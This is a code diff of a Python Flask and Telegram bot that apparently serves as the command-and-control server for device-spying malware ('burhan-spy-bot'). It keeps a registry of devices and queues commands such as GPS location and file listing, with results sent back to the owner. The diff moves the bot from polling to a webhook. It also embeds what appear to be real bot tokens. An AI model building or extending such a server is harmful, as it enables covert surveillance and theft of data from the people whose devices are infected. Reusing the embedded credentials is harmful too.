@@ -1,21 +1,19 @@
 import telebot
-import requests
-import json
-import time
 import os
+from flask import Flask, request
 import sqlite3
+import time
+import json
 from threading import Thread
-from flask import Flask, request, jsonify
-import base64
-import io
 
 # ===== CONFIGURATION =====
-BOT_TOKEN = "8811118034:AAHr5UjOeT43-D4zPadC80V6dmQpgsyqIcM"  # Replace with your bot token
-OWNER_ID = 2062068620          # Your Telegram user ID
-PUBLIC_URL = "https://burhan-spy-bot-production.up.railway.app"
-SERVER_PORT = 3000             # Railway expects port 3000 (from screenshot)
+BOT_TOKEN = "8811118034:AAH2sIRrIgGq1yH6PqelH9mKJrzwkHK_jIs"
+OWNER_ID = 2062068620
+SERVER_PORT = int(os.environ.get('PORT', 5000))
+PUBLIC_URL = "https://burhan-spy-bot-production.up.railway.app"  # ← Ensure this matches your Railway URL
 
-# ===== DATABASE SETUP =====
+# ===== DATABASE (SQLite – Note: Railway ephemeral, for production use PostgreSQL) =====
+# For now, we'll keep SQLite for simplicity. But remember to switch to PostgreSQL for persistent storage.
 DB_FILE = "devices.db"
 conn = sqlite3.connect(DB_FILE, check_same_thread=False)
 c = conn.cursor()
@@ -27,11 +25,13 @@ c.execute("""CREATE TABLE IF NOT EXISTS devices (
 )""")
 conn.commit()
 
-# ===== BOT & FLASK INIT =====
-bot = telebot.TeleBot(BOT_TOKEN)
+# ===== FLASK APP =====
 app = Flask(__name__)
 
-# In-memory command queue and results
+# ===== TELEGRAM BOT SETUP =====
+bot = telebot.TeleBot(BOT_TOKEN)
+
+# ===== IN-MEMORY COMMAND QUEUE =====
 device_commands = {}
 device_results = {}
 
@@ -51,8 +51,7 @@ def is_owner(message):
 def send_command(device_id, command, **params):
     device_commands[device_id] = {"command": command, "params": params}
 
-# ===== TELEGRAM BOT COMMANDS =====
-
+# ===== TELEGRAM BOT HANDLERS =====
 @bot.message_handler(commands=['start'])
 def start(message):
     if not is_owner(message):
@@ -60,7 +59,7 @@ def start(message):
         return
     text = """
 🚀 DarkNet Bot Active (Private)\n
-Commands:\n
+Commands:
 /locate <device_id> - Get GPS + device info
 /devices - List all registered devices
 /files <device_id> - List all file names
@@ -218,10 +217,16 @@ def post_result():
         bot.send_message(OWNER_ID, f"📋 Result from {device_id}:\n{result}")
     return jsonify({"status": "ok"})
 
-# ===== START =====
-def run_bot():
-    bot.polling(non_stop=True)
+# ===== WEBHOOK ENDPOINT =====
+@app.route('/webhook', methods=['POST'])
+def webhook():
+    update = telebot.types.Update.de_json(request.stream.read().decode('utf-8'))
+    bot.process_new_updates([update])
+    return "ok", 200
 
+# ===== START =====
 if __name__ == "__main__":
-    Thread(target=run_bot).start()
-    app.run(host="0.0.0.0", port=SERVER_PORT)  # Port 3000
+    # Set webhook (instead of polling) to avoid 409 Conflict
+    bot.remove_webhook()
+    bot.set_webhook(url=f"{PUBLIC_URL}/webhook")
+    app.run(host="0.0.0.0", port=SERVER_PORT)
